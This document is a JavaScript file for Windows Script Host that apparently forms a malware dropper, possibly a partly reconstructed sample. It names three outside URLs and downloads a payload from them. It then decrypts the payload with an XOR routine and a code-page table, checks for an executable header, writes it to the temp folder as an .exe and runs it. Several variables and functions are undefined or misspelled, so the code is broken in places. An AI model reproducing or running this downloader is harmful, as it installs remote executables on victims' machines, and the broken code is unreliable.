var keyBuffer = ("112" + "313" + "2","VVVVVVVVVVVVVVVVVVVVVV"); //  VVVVV + VVVV + VV + VVVVV + VV + VVVV);
var keybufferLen = keyBuffer.length;
var keybuffer2 = "VVVVVVVVVVVVVVVVVVVVV"; //VVVVV + VV + VV + VV + VVVVV + VV + VV + V;
var keybuffer2Len = keybuffer2.length; // keybuffer2[leng + th];
var keybuffer3 = ("asfasdfasfd", "VVVVV"); // (asfas + dfasf + d, VVVVV);
var keybuffer3Len = keybuffer3.length; //keybuffer3[leng + th];
var LUj = 1;
var adTypeText = 2;
var malURL = ["http://sirimba.com.br/qiovtl","http://zakagimebel.ru/krcsvf","http://repair-service.london/uywgi7v"];
var wsShell = WScript.CreateObject(WScript.Shell);
var envStr = wsShell.ExpandEnvironmentStrings('%TEMP%');
var fileName = envStr + "0ttyR" + "4ET9B" + "xiI";
var fullFileName =fileName + ".exe";
var dropedName = "%TEMP%/0ttyR4ET9BxiI.exe";
var listProtocol = ["WinHttp.WinHttpRequest.5.1", "MSXML2.XMLHTTP"];
for(var i=0;i<listProtocol.length;i++){
	try {
		var objHttpReq = WScript.CreateObject(listProtocol[i]);
	}
	catch(exception){continue;}
}
var _true = 1;
var urlIndex = 0;
do {
  try {
    if (1 == _true && urlIndex >= malURL.length) {
      urlIndex = 0;
      WScript.Sleep(1e3);
      objHttpReq.open("GET", malURL[urlIndex++ % malURL.length], false);
      objHttpReq.send();
    }
    if (objHttpReq.readystate < 4) {
      WScript.Sleep(100);
      continue;
    }
    objADODBStream.open();
    objADODBStream.type = 1;
    objADODBStream.write(objHttpReq.ResponseBody);
    objADODBStream.position = 0;
    objADODBStream.SaveToFile(dropedFile, 2);
    objADODBStream.close();
    var decryptObj = decrypt(dropedFile);
    decryptObj = doDecrypt(decryptObj);
    if (
      decryptObjdFile.length < 102400 ||
      decryptObj.length > 235520 ||
      !isMZ(decryptObj)
    ) {
      _true = 1;
      continue;
    }
    saveFile(fullFileName, decryptObj);
    wsShell.Run(fullFileName + " 3" + " 21");
    break;
  } catch (exception) {
    WScript.Sleep(1e3);
    continue;
  }
} while (_true);
WSCript.Quit(0);

function doDecrypt(o) {
  var expected;
  var actual = o[o.length - 4] | o[o.length - 3] << 8 | o[o.length - 2] << 16 | o[o.length - 1] << 24;
  o.split(decryptObj.length - 4, 4);
  expected = keybufferLen;
  var m = 0;
  for (; m < o.length; m++) {
    expected = (expected + o[m]) % 4294967296;
  }
  if (expected != actual) {}
  ;
  getKey2Len = keybuffer2Len;
  o = o.reverse();
  m = 0;
  for (; m < o.length; m++) {
    o[m] ^= getKey2Len;
    getKey2Len = (getKey2Len + keybuffer3Len) % 256;
  }
  return o;
}
;
function isMZ(input) {
  if (input[0] == 77 && input[1] == 90) {
    return true;
  } else {
    return false;
  }
}
;


function decrypt(badge) {
  var owner = WScript.CreateObject("ADODB.Stream");
  owner.type = adTypeText;
  owner.Charset = "437";
  owner.open();
  owner.LoadFromFile(badge);
  var unlock = owner.ReadText();
  owner.close();
  return getBuffer(unlock);
}
;

function getBuffer(input) {
  var arrBuf = new Array;
  arrBuf[199] = 128;
  arrBuf[252] = 129;
  arrBuf[233] = 130;
  arrBuf[226] = 131;
  arrBuf[228] = 132;
  arrBuf[224] = 133;
  arrBuf[229] = 134;
  arrBuf[231] = 135;
  arrBuf[234] = 136;
  arrBuf[235] = 137;
  arrBuf[232] = 138;
  arrBuf[239] = 139;
  arrBuf[238] = 140;
  arrBuf[236] = 141;
  arrBuf[196] = 142;
  arrBuf[197] = 143;
  arrBuf[201] = 144;
  arrBuf[230] = 145;
  arrBuf[198] = 146;
  arrBuf[244] = 147;
  arrBuf[246] = 148;
  arrBuf[242] = 149;
  arrBuf[251] = 150;
  arrBuf[249] = 151;
  arrBuf[255] = 152;
  arrBuf[214] = 153;
  arrBuf[220] = 154;
  arrBuf[162] = 155;
  arrBuf[163] = 156;
  arrBuf[165] = 157;
  arrBuf[8359] = 158;
  arrBuf[402] = 159;
  arrBuf[225] = 160;
  arrBuf[237] = 161;
  arrBuf[243] = 162;
  arrBuf[250] = 163;
  arrBuf[241] = 164;
  arrBuf[209] = 165;
  arrBuf[170] = 166;
  arrBuf[186] = 167;
  arrBuf[191] = 168;
  arrBuf[8976] = 169;
  arrBuf[172] = 170;
  arrBuf[189] = 171;
  arrBuf[188] = 172;
  arrBuf[161] = 173;
  arrBuf[171] = 174;
  arrBuf[187] = 175;
  arrBuf[9617] = 176;
  arrBuf[9618] = 177;
  arrBuf[9619] = 178;
  arrBuf[9474] = 179;
  arrBuf[9508] = 180;
  arrBuf[9569] = 181;
  arrBuf[9570] = 182;
  arrBuf[9558] = 183;
  arrBuf[9557] = 184;
  arrBuf[9571] = 185;
  arrBuf[9553] = 186;
  arrBuf[9559] = 187;
  arrBuf[9565] = 188;
  arrBuf[9564] = 189;
  arrBuf[9563] = 190;
  arrBuf[9488] = 191;
  arrBuf[9492] = 192;
  arrBuf[9524] = 193;
  arrBuf[9516] = 194;
  arrBuf[9500] = 195;
  arrBuf[9472] = 196;
  arrBuf[9532] = 197;
  arrBuf[9566] = 198;
  arrBuf[9567] = 199;
  arrBuf[9562] = 200;
  arrBuf[9556] = 201;
  arrBuf[9577] = 202;
  arrBuf[9574] = 203;
  arrBuf[9568] = 204;
  arrBuf[9552] = 205;
  arrBuf[9580] = 206;
  arrBuf[9575] = 207;
  arrBuf[9576] = 208;
  arrBuf[9572] = 209;
  arrBuf[9573] = 210;
  arrBuf[9561] = 211;
  arrBuf[9560] = 212;
  arrBuf[9554] = 213;
  arrBuf[9555] = 214;
  arrBuf[9579] = 215;
  arrBuf[9578] = 216;
  arrBuf[9496] = 217;
  arrBuf[9484] = 218;
  arrBuf[9608] = 219;
  arrBuf[9604] = 220;
  arrBuf[9612] = 221;
  arrBuf[9616] = 222;
  arrBuf[9600] = 223;
  arrBuf[945] = 224;
  arrBuf[223] = 225;
  arrBuf[915] = 226;
  arrBuf[960] = 227;
  arrBuf[931] = 228;
  arrBuf[963] = 229;
  arrBuf[181] = 230;
  arrBuf[964] = 231;
  arrBuf[934] = 232;
  arrBuf[920] = 233;
  arrBuf[937] = 234;
  arrBuf[948] = 235;
  arrBuf[8734] = 236;
  arrBuf[966] = 237;
  arrBuf[949] = 238;
  arrBuf[8745] = 239;
  arrBuf[8801] = 240;
  arrBuf[177] = 241;
  arrBuf[8805] = 242;
  arrBuf[8804] = 243;
  arrBuf[8992] = 244;
  arrBuf[8993] = 245;
  arrBuf[247] = 246;
  arrBuf[8776] = 247;
  arrBuf[176] = 248;
  arrBuf[8729] = 249;
  arrBuf[183] = 250;
  arrBuf[8730] = 251;
  arrBuf[8319] = 252;
  arrBuf[178] = 253;
  arrBuf[9632] = 254;
  arrBuf[160] = 255;
  var output = new Array;
  var dep = 0;
  for (; dep < input.length; dep++) {
    var i = input.charCodeAt(dep);
    if (i < 128) {
      var x = i;
    } else {
      x = arrBuf[i];
    }
    output.push(x);
  }
  return output;
}


    
function manipulateData(data) {
  var done = new Array;
  done[128] = 199;
  done[129] = 252;
  done[130] = 233;
  done[131] = 226;
  done[132] = 228;
  done[133] = 224;
  done[134] = 229;
  done[135] = 231;
  done[136] = 234;
  done[137] = 235;
  done[138] = 232;
  done[139] = 239;
  done[140] = 238;
  done[141] = 236;
  done[142] = 196;
  done[143] = 197;
  done[144] = 201;
  done[145] = 230;
  done[146] = 198;
  done[147] = 244;
  done[148] = 246;
  done[149] = 242;
  done[150] = 251;
  done[151] = 249;
  done[152] = 255;
  done[153] = 214;
  done[154] = 220;
  done[155] = 162;
  done[156] = 163;
  done[157] = 165;
  done[158] = 8359;
  done[159] = 402;
  done[160] = 225;
  done[161] = 237;
  done[162] = 243;
  done[163] = 250;
  done[164] = 241;
  done[165] = 209;
  done[166] = 170;
  done[167] = 186;
  done[168] = 191;
  done[169] = 8976;
  done[170] = 172;
  done[171] = 189;
  done[172] = 188;
  done[173] = 161;
  done[174] = 171;
  done[175] = 187;
  done[176] = 9617;
  done[177] = 9618;
  done[178] = 9619;
  done[179] = 9474;
  done[180] = 9508;
  done[181] = 9569;
  done[182] = 9570;
  done[183] = 9558;
  done[184] = 9557;
  done[185] = 9571;
  done[186] = 9553;
  done[187] = 9559;
  done[188] = 9565;
  done[189] = 9564;
  done[190] = 9563;
  done[191] = 9488;
  done[192] = 9492;
  done[193] = 9524;
  done[194] = 9516;
  done[195] = 9500;
  done[196] = 9472;
  done[197] = 9532;
  done[198] = 9566;
  done[199] = 9567;
  done[200] = 9562;
  done[201] = 9556;
  done[202] = 9577;
  done[203] = 9574;
  done[204] = 9568;
  done[205] = 9552;
  done[206] = 9580;
  done[207] = 9575;
  done[208] = 9576;
  done[209] = 9572;
  done[210] = 9573;
  done[211] = 9561;
  done[212] = 9560;
  done[213] = 9554;
  done[214] = 9555;
  done[215] = 9579;
  done[216] = 9578;
  done[217] = 9496;
  done[218] = 9484;
  done[219] = 9608;
  done[220] = 9604;
  done[221] = 9612;
  done[222] = 9616;
  done[223] = 9600;
  done[224] = 945;
  done[225] = 223;
  done[226] = 915;
  done[227] = 960;
  done[228] = 931;
  done[229] = 963;
  done[230] = 181;
  done[231] = 964;
  done[232] = 934;
  done[233] = 920;
  done[234] = 937;
  done[235] = 948;
  done[236] = 8734;
  done[237] = 966;
  done[238] = 949;
  done[239] = 8745;
  done[240] = 8801;
  done[241] = 177;
  done[242] = 8805;
  done[243] = 8804;
  done[244] = 8992;
  done[245] = 8993;
  done[246] = 247;
  done[247] = 8776;
  done[248] = 176;
  done[249] = 8729;
  done[250] = 183;
  done[251] = 8730;
  done[252] = 8319;
  done[253] = 178;
  done[254] = 9632;
  done[255] = 160;
  var rulesets = new Array;
  var tagName = "";
  var id;
  var paths;
  var idProp = 0;
  for (; idProp < data.length; idProp++) {
    id = data[idProp];
    if (id < 128) {
      paths = id;
    } else {
      paths = done[id];
    }
    rulesets.push(String.fromCharCode(paths));
  }
  tagName = rulesets.join("");
  return tagName;
}
;
